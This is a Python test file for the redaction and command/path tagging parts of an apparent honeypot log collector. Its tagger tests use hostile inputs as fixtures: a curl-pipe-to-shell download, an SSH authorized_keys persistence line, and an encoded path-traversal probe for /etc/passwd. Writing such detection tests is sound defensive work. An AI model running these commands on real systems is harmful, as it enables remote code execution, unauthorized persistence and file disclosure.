"""Redaction (PRD 7.3) and the command/path taggers (feed DET-04/DET-05)."""
from hlpa_collector import redact


def test_sanitize_redacts_secret_like_keys():
    out = redact.sanitize({"username": "bob", "password": "swordfish", "api_key": "AKIA123", "note": "ok"})
    assert out["username"] == "bob"
    assert "swordfish" not in str(out)
    assert out["password"].startswith("[redacted fp:")
    assert out["api_key"].startswith("[redacted fp:")


def test_fingerprint_is_stable_and_nonreversible():
    a = redact.fingerprint("samepass")
    b = redact.fingerprint("samepass")
    assert a == b and len(a) == 16
    assert redact.fingerprint("other") != a


def test_sanitize_truncates_long_values():
    out = redact.sanitize({"blob": "x" * 5000})
    assert out["blob"].endswith("...[truncated]")


def test_tagger_flags_discovery_download_persistence(tagger):
    assert "cmd:discovery" in tagger.tag({"command": "uname -a"})
    assert "cmd:download" in tagger.tag({"command": "curl http://x | sh"})
    assert "cmd:persistence" in tagger.tag({"command": "echo key >> ~/.ssh/authorized_keys"})


def test_tagger_web_probe_normalizes_encoding(tagger):
    # %2e%2e%2f == ../  ; tagger should decode before matching
    assert "web:probe" in tagger.tag({"http_path": "/%2e%2e%2fetc/passwd"})
    assert "web:probe" in tagger.tag({"http_path": "/WP-LOGIN.php"})  # case-insensitive


def test_tagger_ignores_benign(tagger):
    assert tagger.tag({"command": "ls -la"}) == []
    assert tagger.tag({"http_path": "/index.html"}) == []
